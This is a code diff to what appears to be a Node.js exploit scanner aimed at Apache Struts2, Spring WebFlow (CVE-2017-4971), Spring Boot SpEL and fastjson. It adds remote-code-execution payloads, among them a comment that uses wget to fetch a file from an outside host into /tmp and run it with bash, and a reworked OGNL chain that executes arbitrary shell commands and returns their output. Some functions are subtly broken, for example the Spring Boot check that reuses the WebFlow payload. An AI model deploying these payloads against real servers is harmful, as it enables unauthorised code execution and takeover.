@@ -308,6 +308,34 @@ function doStruts2_032(url)
     });
 }
 
+/*
+Spring WebFlow 远程代码执行漏洞(CVE-2017-4971)
+&_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.2.140:8000/1")
+&_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/1")
+&_(new+java.lang.ProcessBuilder("touch /tmp/success2")).start()=test
+*/
+function DoWebFlow(url)
+{
+	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"SpringWebFlow-CVE-2017-4971");
+    });
+}
+
+/*
+Spring Boot whitelabel-error-page SpEl 代码执行漏洞(gh-4763)
+payload=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))}.
+*/
+function DoSpringBoot(url)
+{
+	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"SpringBoot-gh-4763");
+    });
+}
+
 // s2-033,s2-037
 // s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
 function doStruts2_037(url)
@@ -404,8 +432,10 @@ function fnDoBody(body,t,rep)
 	}
 	if(!body)return;
 	body = body.toString("utf8").trim();
-	if(-1 < body.indexOf(".opensymphony.xwork2.ActionContext."))return;
+	var rg1 = /(__VIEWSTATEGENERATOR)/gmi;
+	if(rg1.test(body) || -1 < body.indexOf("pwd%3a") || -1 < body.indexOf("echo+whoami"))return;
 
+	//console.log(body.indexOf("echo+whoami"));return;
 	g_oRst.config || (g_oRst.config = {});
 	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
 	{
@@ -554,7 +584,6 @@ function doStruts2_005(url, fnCbk)
 	  , function (error, response, body){
 	  		if(body)
 	  		{
-	  			console.log(body);
 	  			fnDoBody(body,"s2-005");
 	  		}
 	    }
@@ -601,36 +630,43 @@ function doStruts2_019(url, fnCbk,bW)
 */
 function doStruts2_029(url, fnCbk,bW)
 {
+	url = fnNotEnd(url);
 	var s1 = (g_postData),s = 
 		// s-045不允许下面的代码
 		
-		+ "(#_memberAccess['allowPrivateAccess']=true)"
-		+ ",(#_memberAccess['allowStaticMethodAccess']=true)"
-		+ ",(#_memberAccess['acceptProperties']=true)"
-		+ ",(#_memberAccess['excludedPackageNamePatterns']=true)"
-		+ ",(#_memberAccess['excludedPackageNamePatterns']=true)"
-		+ ",(#_memberAccess['excludedClasses']=true)"
+		"#_memberAccess['allowPrivateAccess']=true"
+		+ ",#_memberAccess['allowProtectedAccess']=true"
+		+ ",#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']"
+		+ ",#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true"
+		+ ",#_memberAccess['allowStaticMethodAccess']=true"
+		// + ",(#_memberAccess['acceptProperties']=true)"
+		
+		// + ",(#_memberAccess['excludedPackageNamePatterns']=true)"
+		// + ",("
 		// s2-048不能加下面的代码
 		
-		+ ".(#_memberAccess['allowProtectedAccess']=true)"
-		+ ".(#_memberAccess['acceptProperties']=true)"
-		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)"
-		,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
+		
+		// + ".(#_memberAccess['acceptProperties']=true)"
+		// + ".("
+		//,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
 
-		s = "(" + s + ",#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
-		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+		s = "(" + s + ",#mtx=new java.lang.Boolean('false'),#context['xwork.MethodAccessor.denyMethodExecution']=#mtx"
+		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
+		+ ",#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})"
 		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
 		+ ",#as=new java.lang.String()"
 		+ ",#p.redirectErrorStream(true),#process=#p.start()"
 		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
 		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
 		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",#as.toString()"
 		+")";
-
-	request(fnOptHeader({method: 'POST',uri: url + "?message=" + encodeURIComponent(s)
-		//*
+	// console.log(encodeURIComponent(s));
+	// console.log(url);
+	request(fnOptHeader({method: 'GET',uri: url + "?message=" + encodeURIComponent(s)
+		/*
 		,"formData":{"message":s}
 	    ,headers:
 	    {
@@ -639,7 +675,7 @@ function doStruts2_029(url, fnCbk,bW)
 	    }//*/
 		})
 	  , function (error, response, body){
-	  		console.log(error || body);
+	  		// console.log(error || body);
 	  		if(body)
 	  		{
 	  			fnDoBody(body,"s2-029");
@@ -654,7 +690,7 @@ function fnTestAll()
 	if(!program.proxy && false !== program.host)
 	fnDoHostAttack(g_szUrl,function(o)
 	{
-		console.log(o);
+		fnLog(o);
 	},null);
 	var aMethod = (program.method || "PUT,DELETE,OPTIONS,HEAD,PATCH").split(/[,;]/);
 	for(var k in aMethod)
@@ -989,7 +1025,7 @@ function doStruts2_015(url, fnCbk)
 		  		if(body)
 		  		{
 		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
-		  			fnCbk1(szCmd + '\n' + sR.replace(/(^\s*)|(\s*$)/gmi,''));
+		  			fnCbk1(sR.replace(/(^\s*)|(\s*$)/gmi,''));
 		  			// fnDoBody(body,"s2-015");
 		  		}else fnCbk1(szCmd + '\n');
 		    }
@@ -1013,6 +1049,7 @@ function doStruts2_015(url, fnCbk)
 		if(nC == a.length)
 		{
 			clearInterval(nT);
+			// console.log("kkkk:" +aR.join('') + "kkk");
 			fnDoBody(aR.join("\n"),"s2-015");
 		}
 	},13);
@@ -1269,7 +1306,7 @@ function fastjson(url, fnCbk)
 	    	"Content-Type":"xml/JSON"
 	    }})
 	  , function (error, response, body){
-	  		console.log(error || body);
+	  		//console.log(error || body);
 	  		if(body)
 	  		{
 	  			fnDoBody(body,"s2-009");
@@ -1320,8 +1357,10 @@ process.on('exit', (code) =>
 
 if(program.test)
 {
+	console.log("开始内网测试");
 	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
- 	// doStruts2_029("http://192.168.10.216:8088/S2-029/");
+ 	
+ 	doStruts2_029("http://127.0.0.1:8080/S2-029/default.action");
 	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	
 	// doStruts2_032("http://192.168.10.216:8088/s2-032/login.jsp");
@@ -1330,7 +1369,6 @@ if(program.test)
 	doStruts2_009(g_szUrl);
 	
 	// doStruts2_020(g_szUrl);
-	doStruts2_029(g_szUrl);
 	doStruts2_032(g_szUrl);
 	doStruts2_033(g_szUrl);
 	doStruts2_037(g_szUrl);
@@ -1340,7 +1378,7 @@ if(program.test)
 	doStruts2_046(g_szUrl);
 	doStruts2_048(g_szUrl);
 	//*/
-	//*
+	/*
 	doStruts2_001("http://192.168.10.216:8088/S2-001/login.action");
 	doStruts2_007("http://192.168.10.216:8088/S2-007/user.action");
 	doStruts2_008("http://192.168.10.216:8088/S2-008/devmode.action");
@@ -1349,6 +1387,7 @@ if(program.test)
 	doStruts2_015("http://192.168.10.216:8088/S2-015/");
 	doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_019("http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
+	doStruts2_029("http://192.168.10.216:8088/S2-029/default.action");
 	
 	doStruts2_046("http://192.168.10.216:8082/s2-046/");
 	doStruts2_048("http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
